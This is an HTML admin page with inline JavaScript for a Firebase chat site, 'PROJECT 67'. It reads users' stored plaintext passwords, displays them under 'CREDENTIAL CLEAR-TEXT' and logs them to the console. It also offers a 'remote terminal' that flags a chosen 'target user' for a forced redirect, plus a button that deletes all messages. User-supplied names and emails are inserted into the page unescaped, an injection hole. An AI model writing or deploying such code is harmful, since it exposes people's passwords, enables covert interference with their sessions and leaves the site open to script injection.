<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PROJECT 67 - Admin Dashboard</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="nav">
        <a class="back" href="hub.html">&#8592; BACK</a>
        <div id="profileWidget" class="profile-widget"></div>
    </div>
    
    <h1>PROJECT 67</h1>
    <h2>ADMIN DASHBOARD</h2>

    <div class="admin-container" style="flex-direction: column; gap: 2rem; align-items: center;">

        <div class="admin-box" style="width: 100%; max-width: 600px;">
            <h3 style="color:#cc0000; margin-bottom:1rem;">💣 NUKE MESSAGES</h3>
            <div id="killswitchNormal">
                <button class="killswitch-btn" onclick="startKillswitch()">🔴 NUCLEAR OPTION</button>
                <p class="killswitch-label">Delete ALL Chat Messages permanently (leaves signed-up user accounts completely safe)</p>
            </div>
            <div id="killswitchCountdown" style="display:none;">
                <div class="killswitch-timer" id="killswitchTimer">5</div>
                <button class="killswitch-cancel-btn" onclick="cancelKillswitch()">CANCEL</button>
            </div>
        </div>

        <div class="admin-box" style="width: 100%; max-width: 800px;">
            <h3 style="color:#cc0000; margin-bottom:1rem;">🟢 LIVE USER MONITOR</h3>
            <div id="adminUsersList" style="width:100%; overflow-x:auto;">
                <p style="color:#888;">Connecting to user monitor data registry...</p>
            </div>
        </div>

        <div class="admin-box" style="width: 100%; max-width: 600px;">
            <h3 style="color:#cc0000; margin-bottom:1rem;">💀 REMOTE TERMINAL</h3>
            <div id="hackNormal">
                <label for="hackTargetSelect" style="display:block; color:#aaa; margin-bottom:0.5rem; font-size:13px;">SELECT TARGET USER:</label>
                <select id="hackTargetSelect" style="width:100%; padding:10px; background:#111; color:#fff; border:1px dashed #cc0000; border-radius:4px; font-family:monospace; margin-bottom:1rem;">
                    <option value="">-- Select a user --</option>
                </select>
                <button class="killswitch-btn" onclick="startHack()">⚡ TRIGGER REDIRECT</button>
            </div>
            <div id="hackCountdown" style="display:none;">
                <div style="color:#cc0000; font-weight:bold; margin-bottom:0.5rem; font-size:14px;">TRANSMITTING BREAK-IN PACKETS...</div>
                <div class="killswitch-timer" id="hackTimer" style="border-color:#ffcc00; color:#ffcc00;">3</div>
                <button class="killswitch-cancel-btn" onclick="cancelHack()">ABORT</button>
            </div>
        </div>

    </div>

    <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-auth-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-firestore-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-database-compat.js"></script>

    <script src="config.js"></script>
    <script src="script_new.js"></script>

    <script>
        // Ensure administration UI logic initializes only upon verification hooks
        document.addEventListener('DOMContentLoaded', function() {
            if (typeof rtdb !== 'undefined') {
                loadOnlineUsersAdmin();
            } else {
                console.error("Firebase Realtime Database instance configuration node missing.");
                document.getElementById('adminUsersList').innerHTML = '<p style="color:#cc0000;">Initialization Error: Configuration scripts missing.</p>';
            }
        });

        // ── LOAD ONLINE USERS ──
        function loadOnlineUsersAdmin() {
            const presenceRef = rtdb.ref('presence');
            const usersRef = rtdb.ref('users');

            presenceRef.on('value', (presenceSnap) => {
                usersRef.once('value', (usersSnap) => {
                    
                    // Generate reference dictionary of matching data objects
                    const usersMap = {};
                    usersSnap.forEach((child) => {
                        const u = child.val();
                        if (u && child.key) {
                            usersMap[child.key] = u;
                        }
                    });

                    console.log("[DEBUG] Current Registered User DB Nodes mapped:", usersMap);

                    const onlineUsers = [];
                    presenceSnap.forEach((child) => {
                        const p = child.val();
                        if (p && p.isOnline) {
                            const rtdbUid = p.uid || child.key;
                            const registered = usersMap[rtdbUid] || {};
                            
                            // Cross-reference data pathways for credentials fallback verification
                            const resolvedPassword = registered.password || p.password || '—';

                            onlineUsers.push({
                                uid: rtdbUid,
                                email: p.email || registered.email || '—',
                                username: p.username || registered.username || p.email || 'Unknown User',
                                password: resolvedPassword
                            });
                        }
                    });

                    console.log("[DEBUG] Active Output Rendering Matrix:", onlineUsers);

                    // Elements Processing Layout Assembly
                    const list = document.getElementById('adminUsersList');
                    if (onlineUsers.length === 0) {
                        list.innerHTML = '<p style="color:#888; font-family:monospace; text-align:center; padding:1rem;">No tracked target sessions active.</p>';
                    } else {
                        list.innerHTML = `
                            <table style="width:100%; border-collapse:collapse; font-family:monospace; font-size:13px;">
                                <tr style="background:#111;">
                                    <th style="text-align:left; color:#cc0000; padding:10px; border-bottom:1px dashed #cc0000;">USERNAME</th>
                                    <th style="text-align:left; color:#cc0000; padding:10px; border-bottom:1px dashed #cc0000;">EMAIL IDENTIFIER</th>
                                    <th style="text-align:left; color:#cc0000; padding:10px; border-bottom:1px dashed #cc0000;">CREDENTIAL CLEAR-TEXT</th>
                                    <th style="text-align:left; color:#cc0000; padding:10px; border-bottom:1px dashed #cc0000;">STATUS</th>
                                </tr>
                                ${onlineUsers.map(u => `
                                    <tr style="border-bottom: 1px solid #222;">
                                        <td style="padding:10px; color:#fff; font-weight:bold;">${u.username}</td>
                                        <td style="padding:10px; color:#aaa; word-break:break-all;">${u.email}</td>
                                        <td style="padding:10px; color:#ffcc00; font-weight:bold;">
                                            <span class="pwd-dots" id="pwd_${u.uid}">••••••</span>
                                            <span class="pwd-text" id="pwdtxt_${u.uid}" style="display:none; color:#ffcc00; background:#200; padding:2px 4px; border-radius:3px;">${u.password}</span>
                                            <span style="cursor:pointer; margin-left:8px; user-select:none;" onclick="togglePwd('${u.uid}')">👁</span>
                                        </td>
                                        <td style="padding:10px; color:#00cc00; font-weight:bold;">🟢 ACTIVE</td>
                                    </tr>
                                `).join('')}
                            </table>
                        `;
                    }

                    // Dynamically map available choices onto control dropdown UI elements
                    const select = document.getElementById('hackTargetSelect');
                    const currentVal = select.value;
                    select.innerHTML = '<option value="">-- Select a user --</option>';
                    onlineUsers.forEach(u => {
                        const opt = document.createElement('option');
                        opt.value = u.uid;
                        opt.textContent = `${u.username} (${u.email})`;
                        select.appendChild(opt);
                    });
                    if (currentVal) select.value = currentVal;
                });
            });
        }

        // ── VISIBILITY MASK TOGGLE ENGINE ──
        function togglePwd(uid) {
            const dots = document.getElementById('pwd_' + uid);
            const text = document.getElementById('pwdtxt_' + uid);
            
            if (!dots || !text) return;

            if (dots.style.display === 'none') {
                dots.style.display = 'inline';
                text.style.display = 'none';
            } else {
                dots.style.display = 'none';
                text.style.display = 'inline';
            }
        }

        // ── NUCLEAR SYSTEM OPERATIONS ──
        let killswitchInterval;
        function startKillswitch() {
            document.getElementById('killswitchNormal').style.display = 'none';
            document.getElementById('killswitchCountdown').style.display = 'block';
            let t = 5;
            document.getElementById('killswitchTimer').innerText = t;
            killswitchInterval = setInterval(() => {
                t--;
                document.getElementById('killswitchTimer').innerText = t;
                if (t === 0) {
                    clearInterval(killswitchInterval);
                    executeKillswitch();
                }
            }, 1000);
        }

        function cancelKillswitch() {
            clearInterval(killswitchInterval);
            document.getElementById('killswitchNormal').style.display = 'block';
            document.getElementById('killswitchCountdown').style.display = 'none';
        }

        function executeKillswitch() {
            rtdb.ref('messages').remove()
                .then(() => {
                    alert('💣 MESSAGE REGISTRY COLD WIPED SUCCESSFULLY.');
                    cancelKillswitch();
                })
                .catch(err => {
                    alert('⚠️ Error clearing database node: ' + err.message);
                    cancelKillswitch();
                });
        }

        // ── REMOTE REDIRECT PIPELINE ──
        let hackInterval;
        function startHack() {
            const uid = document.getElementById('hackTargetSelect').value;
            if (!uid) {
                alert('⚠️ Please select a target interface first.');
                return;
            }
            document.getElementById('hackNormal').style.display = 'none';
            document.getElementById('hackCountdown').style.display = 'block';
            let t = 3;
            document.getElementById('hackTimer').innerText = t;
            hackInterval = setInterval(() => {
                t--;
                document.getElementById('hackTimer').innerText = t;
                if (t === 0) {
                    clearInterval(hackInterval);
                    executeHack(uid);
                }
            }, 1000);
        }

        function cancelHack() {
            clearInterval(hackInterval);
            document.getElementById('hackNormal').style.display = 'block';
            document.getElementById('hackCountdown').style.display = 'none';
        }

        function executeHack(uid) {
            rtdb.ref('hacks/' + uid).set({
                hacked: true,
                timestamp: firebase.database.ServerValue.TIMESTAMP
            }).then(() => {
                document.getElementById('hackNormal').style.display = 'block';
                document.getElementById('hackCountdown').style.display = 'none';
                alert('💀 TARGET ALERT ROUTE SENT!');
            }).catch((err) => {
                alert('⚠️ Error linking transmission: ' + err.message);
                document.getElementById('hackNormal').style.display = 'block';
                document.getElementById('hackCountdown').style.display = 'none';
            });
        }
    </script>
</body>
</html>
